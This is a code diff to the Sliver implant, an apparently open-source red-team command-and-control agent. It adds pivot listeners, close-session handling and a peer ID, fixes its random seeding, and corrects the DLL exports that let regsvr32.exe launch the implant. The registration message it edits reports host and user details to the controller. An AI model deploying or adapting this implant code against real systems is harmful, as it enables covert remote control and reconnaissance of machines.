@@ -52,6 +52,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
+	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -83,11 +84,10 @@ var (
 func init() {
 	buf := make([]byte, 8)
 	n, err := rand.Read(buf)
-	seed := uint64(time.Now().Unix())
-	if err == nil && n == len(buf) {
-		binary.LittleEndian.PutUint64(buf, uint64(seed))
+	if err != nil || n != len(buf) {
+		binary.LittleEndian.PutUint64(buf, uint64(time.Now().Unix()))
 	}
-	insecureRand.Seed(int64(seed))
+	insecureRand.Seed(int64(binary.LittleEndian.Uint64(buf)))
 
 	id, err := uuid.NewV4()
 	if err != nil {
@@ -172,12 +172,12 @@ func DllInstall() { main() }
 
 // DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
-// export DllRegisterServer
+//export DllRegisterServer
 func DllRegisterServer() { main() }
 
 // DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
-// export DllUnregisterServer
+//export DllUnregisterServer
 func DllUnregisterServer() { main() }
 
 // {{end}}
@@ -301,8 +301,8 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// {{end}}
 	nextCheckin := time.Now().Add(beacon.Duration())
 	register := registerSliver()
-	register.ActiveC2 = beacon.URL()
-	register.ProxyURL = beacon.ProxyURL()
+	register.ActiveC2 = beacon.ActiveC2
+	register.ProxyURL = beacon.ProxyURL
 	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
@@ -533,7 +533,10 @@ func sessionMainLoop(connection *transports.Connection) error {
 		// {{end}}
 		return nil
 	}
+	pivots.RestartAllListeners(connection.Send)
+	defer pivots.StopAllListeners()
 	defer connection.Stop()
+
 	connectionErrors = 0
 	// Reconnect active pivots
 	// pivots.ReconnectActivePivots(connection)
@@ -595,6 +598,8 @@ func sessionMainLoop(connection *transports.Connection) error {
 			log.Printf("[recv] tunHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
+		} else if envelope.Type == sliverpb.MsgCloseSession {
+			return nil
 		} else {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
@@ -624,7 +629,7 @@ func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.E
 	}
 }
 
-// registerSliver - Creates a registartion protobuf message
+// registerSliver - Creates a registration protobuf message
 func registerSliver() *sliverpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
@@ -666,25 +671,24 @@ func registerSliver() *sliverpb.Register {
 	// {{end}}
 
 	return &sliverpb.Register{
-		Name:     consts.SliverName,
-		Hostname: hostname,
-		Uuid:     uuid,
-		Username: currentUser.Username,
-		Uid:      currentUser.Uid,
-		Gid:      currentUser.Gid,
-		Os:       runtime.GOOS,
-		Version:  version.GetVersion(),
-		Arch:     runtime.GOARCH,
-		Pid:      int32(os.Getpid()),
-		Filename: filename,
-		// ActiveC2:          transports.GetActiveC2(),
+		Name:              consts.SliverName,
+		Hostname:          hostname,
+		Uuid:              uuid,
+		Username:          currentUser.Username,
+		Uid:               currentUser.Uid,
+		Gid:               currentUser.Gid,
+		Os:                runtime.GOOS,
+		Version:           version.GetVersion(),
+		Arch:              runtime.GOARCH,
+		Pid:               int32(os.Getpid()),
+		Filename:          filename,
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
-		// ProxyURL:          transports.GetProxyURL(),
-		ConfigID: "{{ .Config.ID }}",
+		ConfigID:          "{{ .Config.ID }}",
 		// {{if .Config.IsDaemon}}
 		IsDaemon: true,
 		// {{else}}
 		IsDaemon: false,
 		// {{end}}
+		PeerID: pivots.MyPeerID,
 	}
 }
